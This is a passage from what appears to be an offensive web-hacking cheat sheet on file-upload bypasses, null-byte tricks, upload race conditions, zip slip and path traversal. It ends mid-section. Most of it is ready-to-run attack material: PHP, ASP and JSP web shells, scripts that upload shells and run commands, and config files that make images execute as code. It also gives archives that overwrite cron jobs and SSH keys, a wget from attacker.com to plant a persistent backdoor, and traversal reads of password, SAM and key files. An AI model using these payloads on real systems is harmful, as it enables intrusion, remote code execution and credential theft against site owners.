# Perl
.pl, .cgi

# Examples
filename="shell.phtml.jpg"
filename="shell.php5.png"
```

**6. MIME Type Mismatch:**

```bash
# Upload PHP with image MIME type
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
Content-Type: image/jpeg

<?php system($_GET["cmd"]); ?>
------Boundary--
```

**Testing Double Extensions:**

**Burp Intruder Payloads:**

```bash
# Payload position
filename="shell.phpÂ§.extÂ§"

# Payload list
.jpg
.png
.gif
.pdf
.txt
.doc

# Or reverse
filename="shellÂ§.extÂ§.jpg"
# With: .php, .php3, .php5, .phtml
```

**Configuration-Based Attacks:**

**.htaccess Injection (Apache):**

```bash
# Upload .htaccess to enable PHP in uploads directory
filename=".htaccess"
# Content:
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png

# Then upload shell.jpg â†’ executes as PHP
```

**web.config Injection (IIS):**

```xml
<!-- Upload web.config -->
filename="web.config"
<!-- Content: -->
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="PHP-jpg" path="*.jpg" verb="*" modules="FastCgiModule" scriptProcessor="C:\PHP\php-cgi.exe" resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

---

## Null Byte Injection

Null byte injection exploits string termination behavior in certain languages/versions to bypass extension validation.

**Vulnerability Context:**

**Affected:**

- PHP < 5.3.4 (file operations truncate at null byte)
- Some C-based applications using string functions
- Legacy systems with inadequate input handling

**Not Affected:**

- Modern PHP (5.3.4+)
- Python, Node.js, Ruby (null bytes in strings don't cause termination)

**Attack Technique:**

**Basic Null Byte Injection:**

```bash
# URL-encoded null byte: %00
filename="shell.php%00.jpg"

# Application logic:
1. Validates extension: sees ".jpg" â†’ passes validation
2. Saves file: PHP truncates at \x00 â†’ saves as "shell.php"
```

**Example Vulnerable Code (PHP < 5.3.4):**

```php
$filename = $_FILES['file']['name'];

// Validation (vulnerable)
if (substr($filename, -4) === '.jpg') {
    move_uploaded_file($_FILES['file']['tmp_name'], "/uploads/" . $filename);
}

// If filename = "shell.php\x00.jpg"
// substr() sees ".jpg" â†’ validation passes
// move_uploaded_file() truncates at \x00 â†’ saves "shell.php"
```

**Encoding Variations:**

```bash
# Standard URL encoding
%00

# Double encoding
%2500  â†’ %00 â†’ \x00

# Raw byte (in binary uploads)
\x00

# Hex encoding (context-dependent)
\0
```

**Testing Null Byte Injection:**

**Manual Testing:**

```bash
# Burp Repeater
# 1. Intercept upload request
# 2. Modify filename in Content-Disposition header

Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"

# 3. Send request
# 4. Attempt to access both filenames:
curl http://target.com/uploads/shell.php
curl http://target.com/uploads/shell.php%00.jpg
```

**Automated Testing:**

```bash
# curl with null byte
curl -X POST http://target.com/upload \
  -F "file=@shell.php;filename=shell.php%00.jpg" \
  -H "Cookie: session=xyz"

# Python script with raw null byte
import requests

files = {
    'file': ('shell.php\x00.jpg', '<?php system($_GET["cmd"]); ?>', 'image/jpeg')
}
response = requests.post('http://target.com/upload', files=files)
```

**Path Traversal + Null Byte:**

```bash
# Combined attack
filename="../../../var/www/html/shell.php%00.jpg"

# Bypasses both:
1. Extension validation (sees .jpg)
2. Path restriction (if ../ allowed in filename)
```

**File Include + Null Byte (legacy PHP):**

```bash
# Vulnerable LFI code
<?php include($_GET['file'] . ".php"); ?>

# Exploitation
?file=../../../etc/passwd%00
# Includes: ../../../etc/passwd (without .php appended)
```

**Detection Methods:**

```bash
# 1. Upload file with null byte
filename="test.php%00.jpg"

# 2. Check server filesystem (if accessible)
ls -la /uploads/
# Look for: test.php (not test.php\x00.jpg)

# 3. Access both URLs
curl http://target.com/uploads/test.php â†’ 200 OK (vulnerable)
curl http://target.com/uploads/test.php%00.jpg â†’ 404 (confirms truncation)

# 4. Check PHP version
curl http://target.com/info.php  # If phpinfo() available
# Look for: PHP 5.3.3 or earlier â†’ likely vulnerable
```

**Modern Bypass Attempts:**

[Inference: These techniques are less reliable on patched systems]

**Unicode Null Characters:**

```bash
# U+0000 (null character)
filename="shell.php\u0000.jpg"

# UTF-8 encoded null
filename="shell.php\xc0\x80.jpg"  # Overlong encoding

# [Unverified: Effectiveness depends on specific application parsing]
```

**Null in Different Positions:**

```bash
# Middle of extension
filename="shell.ph%00p.jpg"

# Multiple nulls
filename="shell.php%00%00.jpg"

# After path traversal
filename="../%00/../../var/www/html/shell.php"
```

---

## Comprehensive Testing Methodology

**1. Reconnaissance:**

```bash
# Identify upload endpoints
burpsuite â†’ Proxy â†’ HTTP History â†’ Search: "multipart/form-data"

# Note:
- Accepted file types (from client-side validation)
- Upload directory path (from responses/errors)
- File access URL pattern
```

**2. Extension Testing:**

```bash
# Test executable extensions
.php, .php3, .php4, .php5, .phtml, .phar
.asp, .aspx, .cer
.jsp, .jspx
.pl, .cgi
.py, .rb

# Test double extensions
shell.php.jpg
shell.php.png
shell.phtml.gif

# Test case variations
shell.PHP
shell.PhP
shell.pHp
```

**3. Path Traversal Testing:**

```bash
# Simple traversal
filename="../shell.php"
filename="../../shell.php"
filename="../../../var/www/html/shell.php"

# Encoded traversal
filename="..%2Fshell.php"
filename="..%252Fshell.php"

# Absolute paths
filename="/var/www/html/shell.php"
```

**4. Null Byte Testing:**

```bash
# If target appears to run PHP < 5.3.4
filename="shell.php%00.jpg"
filename="shell.php\x00.jpg"
filename="shell.php%2500.jpg"  # Double encoded
```

**5. Polyglot Testing:**

```bash
# Create GIF+PHP polyglot
echo 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php

# Upload and access
curl http://target.com/uploads/shell.php?cmd=id
```

**6. Configuration File Uploads:**

```bash
# .htaccess (Apache)
filename=".htaccess"
content="AddType application/x-httpd-php .jpg"

# web.config (IIS)
filename="web.config"
content="[XML config to enable .jpg execution]"

# Then upload shell.jpg
```

**7. MIME Type Manipulation:**

```bash
# Upload PHP with image MIME
Content-Type: image/jpeg  # vs application/x-php

# Upload with octet-stream
Content-Type: application/octet-stream

# Empty content-type
Content-Type: 
```

**Automated Tools:**

**Upload Scanner (Burp Extension):**

```bash
# Install: Extender â†’ BApp Store â†’ "Upload Scanner"
# Automatically tests:
- Extension bypasses
- MIME type bypasses
- Path traversal
- Magic byte manipulation
```

**Fuxploider:**

```bash
# Automated upload vulnerability scanner
git clone https://github.com/almandin/fuxploider
cd fuxploider
python3 fuxploider.py --url http://target.com/upload --not-regex "error"

# Tests multiple bypass techniques automatically
```

**Custom Testing Script:**

```python
import requests

base_url = "http://target.com"
upload_endpoint = "/upload"
session_cookie = "session=xyz789"

payloads = [
    ("shell.php", "<?php system($_GET['cmd']); ?>"),
    ("shell.php.jpg", "<?php system($_GET['cmd']); ?>"),
    ("shell.php%00.jpg", "<?php system($_GET['cmd']); ?>"),
    ("../shell.php", "<?php system($_GET['cmd']); ?>"),
    ("GIF89a<?php system($_GET['cmd']); ?>", "shell.php"),
]

for filename, content in payloads:
    files = {'file': (filename, content, 'image/jpeg')}
    cookies = {'session': session_cookie.split('=')[1]}
    r = requests.post(base_url + upload_endpoint, files=files, cookies=cookies)
    
    # Attempt access
    test_paths = [
        f"/uploads/{filename}",
        f"/{filename}",
        f"/uploads/../{filename}"
    ]
    
    for path in test_paths:
        resp = requests.get(base_url + path, cookies=cookies)
        if resp.status_code == 200 and 'php' not in resp.headers.get('Content-Type', ''):
            print(f"[+] Potential RCE: {path}")
```

---

## Race Conditions in Upload

### Attack Principle

Race condition attacks exploit the time gap between file upload validation and processing. The server validates the file (checking extension, MIME type, content), then moves or renames it. During this window, an attacker attempts to access the file before security checks complete or before the file is moved to a non-executable location.

### Time-of-Check-Time-of-Use (TOCTOU) Pattern

**Vulnerable Flow:**

1. File uploaded to temporary directory with original name
2. Server validates file content/type
3. If valid, file moved to permanent location
4. If invalid, file deleted

**Attack Window:** Between step 1 and step 3/4, the file exists with a predictable name in an accessible location.

### Exploitation Techniques

**Basic Race Condition Attack:**

```bash
# Terminal 1: Upload malicious file repeatedly
while true; do
  curl -X POST -F "file=@shell.php" http://target.com/upload.php
done

# Terminal 2: Attempt to access the file repeatedly
while true; do
  curl http://target.com/uploads/shell.php?cmd=id
done
```

**Optimized Parallel Race:**

```bash
# Using GNU Parallel for coordinated timing
parallel -j 50 'curl -X POST -F "file=@shell.php" http://target.com/upload.php' ::: {1..100} &
parallel -j 50 'curl http://target.com/uploads/shell.php?cmd=whoami' ::: {1..100}
```

**Python Race Condition Script:**

```python
import requests
import threading
import time

target_upload = "http://target.com/upload.php"
target_access = "http://target.com/uploads/shell.php"
shell_file = "shell.php"

def upload_file():
    while True:
        with open(shell_file, 'rb') as f:
            files = {'file': f}
            requests.post(target_upload, files=files)

def access_file():
    while True:
        try:
            r = requests.get(target_access + "?cmd=id", timeout=1)
            if r.status_code == 200 and "uid=" in r.text:
                print(f"[SUCCESS] Shell executed: {r.text}")
                return
        except:
            pass

# Launch multiple upload threads
for _ in range(10):
    t = threading.Thread(target=upload_file)
    t.daemon = True
    t.start()

# Launch multiple access threads
for _ in range(10):
    t = threading.Thread(target=access_file)
    t.daemon = True
    t.start()

time.sleep(30)  # Run for 30 seconds
```

### Detection and Reconnaissance

**Identify Temporary Upload Locations:**

```bash
# Common temporary directories
/tmp/
/var/tmp/
/dev/shm/
/tmp/php*
/var/www/html/uploads/tmp/
/upload/temp/
```

**Predict Temporary Filenames:**

Many applications use predictable naming schemes:

- Original filename: `shell.php`
- MD5 hash: `md5sum shell.php` â†’ `5d41402abc4b2a76b9719d911017c592.php`
- Timestamp-based: `1634567890_shell.php`
- Session-based: `sess_abc123_shell.php`

**Burp Suite Configuration:**

```
1. Intruder â†’ Positions
   - Upload endpoint as target
   - Set payload position in filename if controllable

2. Intruder â†’ Payloads
   - Payload type: Null payloads
   - Generate 100-1000 requests
   - Disable payload encoding

3. Options
   - Thread count: 10-20
   - Connection: Keep-alive

4. Second Intruder tab for access attempts
   - Sync timing with upload requests
```

### Advanced Techniques

**Symlink Race Condition:**

If the application follows symlinks during validation:

```bash
# Create symlink pointing to allowed file
ln -s allowed.txt evil.php

# Upload symlink
curl -X POST -F "file=@evil.php" http://target.com/upload.php

# Replace symlink target
rm evil.php
echo '<?php system($_GET["cmd"]); ?>' > evil.php

# Access before cleanup
curl http://target.com/uploads/evil.php?cmd=id
```

**Double Extension Race:**

```bash
# Upload file with double extension
# Server may validate first extension, execute second

# Create payload
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg

# Race condition script
while true; do
  curl -X POST -F "file=@shell.php.jpg" http://target.com/upload.php &
  curl http://target.com/uploads/shell.php.jpg?cmd=id
  sleep 0.01
done
```

### Tool-Specific Commands

**Turbo Intruder (Burp Extension):**

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=50,
                          requestsPerConnection=100,
                          pipeline=False)
    
    # Upload requests
    for i in range(500):
        engine.queue(target.req)
    
    # Access requests with slight delay
    for i in range(500):
        engine.queue(access_req, gate='race1')
    
    engine.openGate('race1')

def handleResponse(req, interesting):
    if 'uid=' in req.response:
        table.add(req)
```

## Executable File Uploads

### Bypass Techniques by Validation Type

#### Client-Side Validation Bypass

**JavaScript Validation:**

```bash
# Intercept with Burp Suite
# Modify Content-Type and filename after client-side check passes

# Or disable JavaScript in browser
# Firefox: about:config â†’ javascript.enabled = false
```

**Direct POST Request:**

```bash
curl -X POST \
  -H "Content-Type: multipart/form-data" \
  -F "file=@shell.php;type=image/jpeg" \
  http://target.com/upload.php
```

#### Extension Validation Bypass

**Case Manipulation:**

```bash
# If blocklist checks lowercase only
shell.PHP
shell.PhP
shell.pHp
```

**Null Byte Injection (PHP < 5.3.4):**

```bash
# Filename: shell.php%00.jpg
# Server sees: shell.php (null terminates string)

curl -X POST \
  -F "file=@shell.php;filename=shell.php%00.jpg" \
  http://target.com/upload.php
```

**Double Extensions:**

```bash
shell.php.jpg
shell.jpg.php
shell.php.jpeg
shell.asp;.jpg
shell.php.png
```

**Alternative Extensions by Platform:**

PHP:

```
.php, .php3, .php4, .php5, .php7, .pht, .phtml, .phps, .phar, .inc
```

ASP/ASPX:

```
.asp, .aspx, .cer, .asa, .asax, .ascx, .ashx, .asmx, .axd, .config
```

JSP:

```
.jsp, .jspx, .jsw, .jsv, .jspf
```

Perl:

```
.pl, .pm, .cgi, .lib
```

**Special Character Bypass:**

```bash
# Trailing spaces (Windows)
shell.php___ (spaces)

# Trailing dots (Windows)
shell.php.....

# Unicode variations
shell.php%E2%80%AE (Right-to-Left Override)
# Displays as: php.llehs

# Directory traversal in filename
../../shell.php
....//....//shell.php
```

#### MIME Type Bypass

**Content-Type Header Manipulation:**

```bash
# Change Content-Type to allowed type
curl -X POST \
  -F "file=@shell.php;type=image/jpeg" \
  http://target.com/upload.php

# Or use Burp to intercept and modify:
# Content-Type: image/jpeg
# But actual content: <?php system($_GET['cmd']); ?>
```

**Magic Bytes Insertion:**

```bash
# Add JPEG magic bytes to PHP shell
printf '\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\n<?php system($_GET["cmd"]); ?>' > shell.php

# Add GIF magic bytes
printf 'GIF89a\n<?php system($_GET["cmd"]); ?>' > shell.php

# Add PNG magic bytes
printf '\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\n<?php system($_GET["cmd"]); ?>' > shell.php
```

**Polyglot File Creation:**

```bash
# Create valid image that is also valid PHP
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.php.jpg

# Or manually inject into metadata
echo '<?php system($_GET["cmd"]); ?>' >> valid_image.jpg
mv valid_image.jpg shell.php.jpg
```

#### Content Validation Bypass

**Image Processing Bypass:**

If server uses ImageMagick or GD for validation:

```bash
# Create minimal valid image with embedded PHP

# Method 1: Exiftool
exiftool -Comment='<?php system($_GET["cmd"]); ?>' input.jpg

# Method 2: Create minimal JPEG
echo -e '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xDB\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0C\x14\r\x0C\x0B\x0B\x0C\x19\x12\x13\x0F\x14\x1D\x1A\x1F\x1E\x1D\x1A\x1C\x1C $.\' ",#\x1C\x1C(7),01444\x1F\'"9=82<.342\xFF\xC0\x00\x0B\x08\x00\x01\x00\x01\x01\x01\x11\x00\xFF\xC4\x00\x1F\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\t\n\x0B\xFF\xC4\x00\xB5\x10\x00\x02\x01\x03\x03\x02\x04\x03\x05\x05\x04\x04\x00\x00\x01}\x01\x02\x03\x00\x04\x11\x05\x12!1A\x06\x13Qa\x07"q\x142\x81\x91\xA1\x08#B\xB1\xC1\x15R\xD1\xF0$3br\x82\t\n\x16\x17\x18\x19\x1A%&\'()*456789:BCDEFGHIJSTUVWXYZcdefghijstuvwxyz\x83\x84\x85\x86\x87\x88\x89\x8A\x92\x93\x94\x95\x96\x97\x98\x99\x9A\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFF\xDA\x00\x08\x01\x01\x00\x00?\x00\xFC\xFF\xD9<?php system($_GET["cmd"]); ?>' > shell.jpg
```

**Archive with Executable Inside:**

```bash
# If server extracts archives
zip payload.zip shell.php
tar -czf payload.tar.gz shell.php

# With directory traversal
zip payload.zip ../../../var/www/html/shell.php
```

### Server Configuration Exploitation

#### .htaccess Upload (Apache)

If `.htaccess` uploads are allowed:

```bash
# Create malicious .htaccess
echo 'AddType application/x-httpd-php .jpg' > .htaccess

# Upload .htaccess
curl -X POST -F "file=@.htaccess" http://target.com/upload.php

# Upload PHP code as JPG
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
curl -X POST -F "file=@shell.jpg" http://target.com/upload.php

# Access shell
curl http://target.com/uploads/shell.jpg?cmd=id
```

**Alternative .htaccess Directives:**

```apache
# Execute .jpg as PHP
AddHandler application/x-httpd-php .jpg

# Execute all files as PHP
AddHandler application/x-httpd-php .xxx

# Override php.ini settings
php_flag engine on

# Allow .php execution despite config
<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

#### web.config Upload (IIS)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers>
         <add name="PHP_via_FastCGI" 
              path="*.jpg" 
              verb="*" 
              modules="FastCgiModule" 
              scriptProcessor="C:\PHP\php-cgi.exe" 
              resourceType="Unspecified" />
      </handlers>
   </system.webServer>
</configuration>
```

### Payload Examples

**Minimal PHP Shell:**

```php
<?php system($_GET[0]); ?>
```

**PHP Shell with Multiple Functions:**

```php
<?php
// Usage: ?cmd=id or ?e=id
@system($_GET['cmd']);
@eval($_POST['e']);
@assert($_REQUEST['a']);
?>
```

**ASP Shell:**

```asp
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = Request.Form("cmd")
szTempFile = "C:\temp\output.txt"
Call oScript.Run("cmd /c " & szCMD & " > " & szTempFile, 0, True)
Set oFile = oFileSys.OpenTextFile(szTempFile, 1, False, 0)
Response.Write(oFile.ReadAll)
%>
```

**JSP Shell:**

```jsp
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
InputStream in = p.getInputStream();
int c;
while ((c = in.read()) != -1) {
    out.print((char)c);
}
%>
```

### Testing Methodology

**Systematic Bypass Testing:**

```bash
# 1. Test extension variations
for ext in php phtml php3 php4 php5 php7 pht phps; do
  echo '<?php system("id"); ?>' > test.$ext
  curl -X POST -F "file=@test.$ext" http://target.com/upload.php
done

# 2. Test double extensions
for ext in jpg png gif pdf; do
  echo '<?php system("id"); ?>' > test.php.$ext
  curl -X POST -F "file=@test.php.$ext" http://target.com/upload.php
done

# 3. Test MIME bypass
for mime in image/jpeg image/png image/gif application/pdf; do
  curl -X POST -F "file=@shell.php;type=$mime" http://target.com/upload.php
done

# 4. Test special characters
for special in "shell.php " "shell.php." "shell.php::$DATA"; do
  echo '<?php system("id"); ?>' > "$special"
  curl -X POST -F "file=@$special" http://target.com/upload.php
done
```

## Archive Extraction Vulnerabilities

### Directory Traversal via Archive

**Zip Slip Vulnerability:**

When archives are extracted without path validation, files can be written outside the intended directory.

**Create Malicious Zip (Python):**

```python
import zipfile

# Create zip with directory traversal
with zipfile.ZipFile('malicious.zip', 'w') as zf:
    # Write file to parent directory
    zf.writestr('../../../../var/www/html/shell.php', '<?php system($_GET["cmd"]); ?>')
    
    # Multiple traversal patterns
    zf.writestr('....//....//....//var/www/html/shell2.php', '<?php system($_GET["cmd"]); ?>')
    
    # Windows path
    zf.writestr('..\\..\\..\\..\\xampp\\htdocs\\shell.php', '<?php system($_GET["cmd"]); ?>')
```

**Create Malicious Zip (Command Line):**

```bash
# Linux
ln -s /var/www/html/shell.php shell.php
zip --symlinks malicious.zip shell.php

# Or using tar
tar -czf malicious.tar.gz --transform='flags=r;s|shell.php|../../../../var/www/html/shell.php|' shell.php

# Test extraction locally first
unzip -l malicious.zip
tar -tzf malicious.tar.gz
```

**Evilarc Tool:**

```bash
# Install
git clone https://github.com/ptoomey3/evilarc.git
cd evilarc

# Create malicious archive
python evilarc.py -o unix -d 5 -p var/www/html/ shell.php

# Options:
# -o: OS (unix/win)
# -d: depth of traversal
# -p: target path
# -f: output filename

# Windows target
python evilarc.py -o win -d 5 -p "C:\\inetpub\\wwwroot\\" shell.php
```

### Symlink Attacks

**Create Archive with Symlink:**

```bash
# Create symlink to sensitive file
ln -s /etc/passwd sensitive.txt

# Create archive preserving symlinks
tar -czf symlink.tar.gz sensitive.txt
zip --symlinks symlink.zip sensitive.txt

# When extracted by server, symlink may allow reading /etc/passwd
```

**Exploitation Flow:**

```bash
# 1. Upload archive with symlink
curl -X POST -F "file=@symlink.zip" http://target.com/upload.php

# 2. Server extracts archive
# 3. Access symlinked file through web interface
curl http://target.com/uploads/sensitive.txt
```

### Archive Bomb (Decompression Bomb)

**Zip Bomb Creation:**

```bash
# Create large file of zeros
dd if=/dev/zero bs=1M count=10000 | gzip > 10GB.gz

# Or use recursive compression
echo "0" > file.txt
for i in {1..20}; do
  zip -r $i.zip $(($i-1)).zip file.txt
done
```

**Purpose:** Denial of Service by exhausting disk space or memory during extraction.

[Unverified]: Effectiveness depends on server extraction timeout and resource limits.

### TAR Arbitrary File Overwrite

**Overwrite System Files:**

```bash
# Create tar that overwrites cron job
echo '* * * * * root /tmp/shell.sh' > root
tar -czf malicious.tar.gz --transform='flags=r;s|root|/etc/cron.d/root|' root

# Or overwrite authorized_keys
tar -czf malicious.tar.gz --transform='flags=r;s|key.pub|/root/.ssh/authorized_keys|' key.pub
```

### Testing for Extraction Vulnerabilities

**Reconnaissance:**

```bash
# 1. Identify allowed archive types
curl -X POST -F "file=@test.zip" http://target.com/upload.php
curl -X POST -F "file=@test.tar.gz" http://target.com/upload.php
curl -X POST -F "file=@test.tar" http://target.com/upload.php
curl -X POST -F "file=@test.rar" http://target.com/upload.php

# 2. Check extraction behavior
# Upload archive with known filename
# Check if accessible at predictable location
curl http://target.com/uploads/test.txt

# 3. Test depth limit
# Upload archives with varying traversal depths (../../../, ../../../../, etc.)
```

**Automated Testing Script:**

```python
import zipfile
import requests
import os

target_upload = "http://target.com/upload.php"
target_base = "http://target.com/"

# Test different traversal depths
for depth in range(1, 10):
    traversal = "../" * depth
    filename = f"{traversal}shell_{depth}.php"
    
    # Create malicious zip
    with zipfile.ZipFile(f'test_{depth}.zip', 'w') as zf:
        zf.writestr(filename, '<?php echo "DEPTH_' + str(depth) + '"; ?>')
    
    # Upload
    with open(f'test_{depth}.zip', 'rb') as f:
        files = {'file': f}
        r = requests.post(target_upload, files=files)
    
    # Test access at various locations
    test_paths = [
        f"shell_{depth}.php",
        f"../shell_{depth}.php",
        f"../../shell_{depth}.php",
        f"uploads/shell_{depth}.php"
    ]
    
    for path in test_paths:
        test_url = target_base + path
        try:
            r = requests.get(test_url)
            if f"DEPTH_{depth}" in r.text:
                print(f"[SUCCESS] Found at: {test_url} with depth: {depth}")
        except:
            pass
    
    os.remove(f'test_{depth}.zip')
```

### Platform-Specific Extraction Issues

**Linux/Unix:**

```bash
# Exploits tar extraction
tar -xzf malicious.tar.gz -C /var/www/html/

# If no path sanitization, files extracted with traversal paths
```

**Windows:**

```bash
# Alternate Data Streams (ADS)
echo '<?php system($_GET["cmd"]); ?>' > shell.php:hidden.txt

# Create zip with ADS
# When extracted on Windows, may bypass detection
```

### Common Vulnerable Functions

**PHP:**

```php
// Vulnerable extraction
$zip = new ZipArchive;
$zip->open('upload.zip');
$zip->extractTo('/var/www/html/uploads/');  // No path validation
$zip->close();

// Vulnerable tar extraction
$phar = new PharData('upload.tar');
$phar->extractTo('/var/www/html/uploads/', null, true);  // Overwrite enabled
```

**Python:**

```python
# Vulnerable extraction
import zipfile
with zipfile.ZipFile('upload.zip', 'r') as zf:
    zf.extractall('/var/www/html/uploads/')  # No path validation

# Vulnerable tar
import tarfile
with tarfile.open('upload.tar.gz', 'r:gz') as tf:
    tf.extractall('/var/www/html/uploads/')  # No path validation
```

### Defense Evasion

**Bypass Filename Filters:**

```bash
# URL encoding in filename
../../../var/www/html/shell.php â†’ %2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2fwww%2fhtml%2fshell.php

# Unicode normalization
../ â†’ %c0%ae%c0%ae%c0%af

# Overlong UTF-8
../ â†’ %e0%80%ae%e0%80%ae%e0%80%af

# Mixed separators
..\/..\/..\/var/www/html/shell.php
```

### Tool Suite

**Burp Extensions:**

- Upload Scanner: Automated testing of upload restrictions
- Zip Slip Scanner: Detects zip slip vulnerabilities

**Command-Line Tools:**

```bash
# Create various malicious archives
# Evilarc
python evilarc.py -o unix -d 4 -p var/www/html/ shell.php

# Zipfile analysis
zipinfo -v malicious.zip
unzip -l malicious.zip

# Tar analysis
tar -tvf malicious.tar.gz
```

### Exploitation Chain Example

```bash
# 1. Reconnaissance
curl -X POST -F "file=@test.zip" http://target.com/upload.php

# 2. Create payload
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 3. Create malicious archive with traversal
python evilarc.py -o unix -d 5 -p var/www/html/ shell.php

# 4. Upload
curl -X POST -F "file=@evil.zip" http://target.com/upload.php

# 5. Access shell
curl "http://target.com/shell.php?cmd=id"

# 6. Establish persistence
curl "http://target.com/shell.php?cmd=wget http://attacker.com/backdoor.php -O /var/www/html/favicon.ico.php"
```

---

**Related Topics:** Path traversal, unrestricted file upload, server-side request forgery (SSRF) via archive processing, XML external entity (XXE) injection in archive metadata, arbitrary file write vulnerabilities.

---

# Path Traversal & Directory Traversal

## Core Concept

Path traversal (directory traversal) exploits insufficient sanitization of user-supplied file paths, allowing attackers to access files outside the intended directory. The vulnerability occurs when applications construct file paths using untrusted input without proper validation.

## Traversal Sequences

### Basic Traversal Patterns

**Fundamental sequences:**

- `../` - Unix/Linux parent directory
- `..\` - Windows parent directory
- `..;/` - Some parsers treat semicolon as separator
- `....//` - Stripped to `../` if filters remove `../` once
- `..../` - Alternative evasion pattern

**Standard exploitation:**

```bash
# Read /etc/passwd on Linux
curl "http://target.com/download?file=../../../../etc/passwd"

# Read Windows SAM (requires privileges)
curl "http://target.com/download?file=..\..\..\..\windows\system32\config\sam"

# Access application config
curl "http://target.com/page?template=../../config/database.yml"
```

**Nested traversal (evasion):**

```bash
# If application strips ../ once
....//....//....//etc/passwd

# Double sequence
..././..././..././etc/passwd
```

### Testing Methodology

**Depth enumeration:**

```bash
# Incrementally increase traversal depth
for i in {1..10}; do
    traversal=$(printf '../%.0s' $(seq 1 $i))
    curl "http://target.com/file?name=${traversal}etc/passwd"
done
```

**Common Linux targets:**

- `/etc/passwd` - User enumeration
- `/etc/shadow` - Password hashes (requires root)
- `/proc/self/environ` - Environment variables
- `/proc/self/cmdline` - Process command line
- `/var/log/apache2/access.log` - Log poisoning vectors
- `/home/user/.ssh/id_rsa` - SSH private keys
- `/var/www/html/.git/config` - Git repository data

**Common Windows targets:**

- `C:\windows\system32\drivers\etc\hosts`
- `C:\inetpub\wwwroot\web.config`
- `C:\windows\win.ini`
- `C:\boot.ini` (older systems)
- `C:\windows\system32\config\SAM`

## Encoding Bypass Techniques

### URL Encoding

**Single encoding:**

```bash
# Standard URL encoding
../ â†’ %2e%2e%2f
..\ â†’ %2e%2e%5c

# Example
curl "http://target.com/file?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

**Selective encoding (hybrid approach):**

```bash
# Encode only dots
../ â†’ %2e%2e/
# Encode only slashes  
../ â†’ ..%2f

# Example
curl "http://target.com/file?path=%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

### Double URL Encoding

**Purpose:** Bypasses filters that decode once but fail to validate after decoding

```bash
# Double encode traversal
../ â†’ %2e%2e%2f â†’ %252e%252e%252f

# Example
curl "http://target.com/file?path=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
```

**Burp Suite automation:**

```
1. Capture request in Proxy
2. Send to Repeater
3. Right-click parameter â†’ Convert selection â†’ URL â†’ URL-encode key characters
4. Repeat encoding process
```

### Unicode/UTF-8 Encoding

**Overlong UTF-8 sequences:**

```bash
# Standard . = 0x2e
# Overlong 2-byte: %c0%ae
# Overlong 3-byte: %e0%80%ae

# Standard / = 0x2f  
# Overlong 2-byte: %c0%af
# Overlong 3-byte: %e0%80%af

# Example
curl "http://target.com/file?path=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd"
```

**Unicode normalization exploits:**

```bash
# Fullwidth encoding
../ â†’ ï¹’ï¹’ï¼ â†’ %ef%b9%92%ef%b9%92%ef%bc%8f

# Example (less common, context-dependent)
curl "http://target.com/file?path=%ef%b9%92%ef%b9%92%ef%bc%8f%ef%b9%92%ef%b9%92%ef%bc%8fetc%ef%bc%8fpasswd"
```

### 16-bit Unicode Encoding

**Windows-specific IIS exploits:**

```bash
# . represented as %u002e
# / represented as %u002f

# Example  
curl "http://target.com/file?path=%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd"
```

## Absolute Path Specifications

### Bypassing Weak Filters

**Scenario:** Application prepends base directory but fails to validate absolute paths

```bash
# If application does: basedir + user_input
# And basedir = "/var/www/files/"

# Attempt absolute path
curl "http://target.com/file?name=/etc/passwd"

# If working directory check exists, try
curl "http://target.com/file?name=/var/www/../../etc/passwd"
```

### Path Injection

**Combined with traversal:**

```bash
# Application expects filename.txt
# Inject absolute path with traversal
curl "http://target.com/file?name=../../../etc/passwd%00.txt"

# Windows absolute path
curl "http://target.com/file?name=C:\windows\system32\config\sam"
```

### Tool-Specific Exploitation

**Using dotdotpwn:**

```bash
# HTTP module with absolute paths
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd -k "root:" -d 6 -t 200

# Custom payload with absolute path
dotdotpwn -m http -h target.com -x 80 -f /etc/passwd -k "root:" -b -C -r payloads.txt
```

**Using wfuzz:**

```bash
